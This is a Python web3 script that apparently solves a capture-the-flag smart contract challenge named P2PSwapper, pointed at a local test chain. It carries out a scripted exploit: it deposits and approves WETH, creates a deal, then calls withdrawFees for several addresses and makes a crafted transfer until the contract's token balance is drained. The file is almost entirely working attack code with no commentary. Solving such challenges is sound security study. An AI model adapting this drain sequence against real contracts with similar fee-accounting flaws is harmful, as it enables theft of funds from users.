# -*-coding:utf-8-*-
__author__ = 'joker'

import json
import time
from web3 import Web3, HTTPProvider
from web3.gas_strategies.time_based import fast_gas_price_strategy, slow_gas_price_strategy, medium_gas_price_strategy

# infura_url = 'https://ropsten.infura.io/v3/xxxx'
infura_url = 'http://127.0.0.1:7545'
web3 = Web3(Web3.HTTPProvider(infura_url, request_kwargs={'timeout': 600}))

web3.eth.setGasPriceStrategy(fast_gas_price_strategy)
gasprice = web3.eth.generateGasPrice()
print("[+] fast gas price {0}...".format(gasprice))

player_private_key = ''
player_account = web3.eth.account.privateKeyToAccount(player_private_key)
web3.eth.defaultAccount = player_account.address
print("[+] account {0}...".format(player_account.address))
player2_address = ''
player3_address = ''
player4_address = ''


def send_transaction_sync(tx, account, args={}):
    args['nonce'] = web3.eth.getTransactionCount(account.address)
    signed_txn = account.signTransaction(tx.buildTransaction(args))
    tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
    time.sleep(30)
    return web3.eth.waitForTransactionReceipt(tx_hash)

challenge_address = ""
with open('./P2PSwapper/challenge.abi', 'r') as f:
    abi = json.load(f)
challenge_contract = web3.eth.contract(address=challenge_address, abi=abi)
p2pweth_address = challenge_contract.functions.p2pweth().call()

print("[+] p2pweth {0}...".format(p2pweth_address))
with open('./P2PSwapper/p2pweth.abi', 'r') as f:
    abi = json.load(f)
p2pweth_contract = web3.eth.contract(address=p2pweth_address, abi=abi)


# p2pweth.deposit(1eth)
print("[+] step1 player p2pweth deposit 1eth...")
tx = p2pweth_contract.functions.deposit()
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice, 'value': 1000000000000000000})
#

# approve(instance, 10eth = 1*10^19 = 10000000000000000000)
print("[+] step2 player approve(instance, 10eth = 1*10^19 = 10000000000000000000)...")
tx = p2pweth_contract.functions.approve(guy=challenge_address, wad=10000000000000000000)
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

# P2PSwapper.createDeal(p2pweth, 1, p2pweth, 1) (value:3133338)
print("[+] step3 createDeal(p2pweth, 1, p2pweth, 1) with player (value:3133338)...")
tx = challenge_contract.functions.createDeal(bidToken=p2pweth_address, bidPrice=1, askToken=p2pweth_address, askAmount=1)
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice, 'value': 3133338})
#

# P2PSwapper.withdrawFees(player2)
print("[+] step4 withdrawFees(player2) from player...")
tx = challenge_contract.functions.withdrawFees(user=player2_address)
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

# P2PSwapper.withdrawFees(player3)
print("[+] step5 withdrawFees(player3) from player...")
tx = challenge_contract.functions.withdrawFees(user=player3_address)
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

# p2pweth.transfer(instance) = 1253330
print("[+] step6 p2pweth.transfer(instance) = 1253330...")
tx = p2pweth_contract.functions.transfer(dst=challenge_address, wad=1253330)
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

# P2PSwapper.withdrawFees(player4)
print("[+] step7 withdrawFees(player2) from player...")
tx = challenge_contract.functions.withdrawFees(user=player4_address)
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

print('[+] Solved {0} ...'.format(p2pweth_contract.functions.balanceOf(challenge_address).call() == 0))
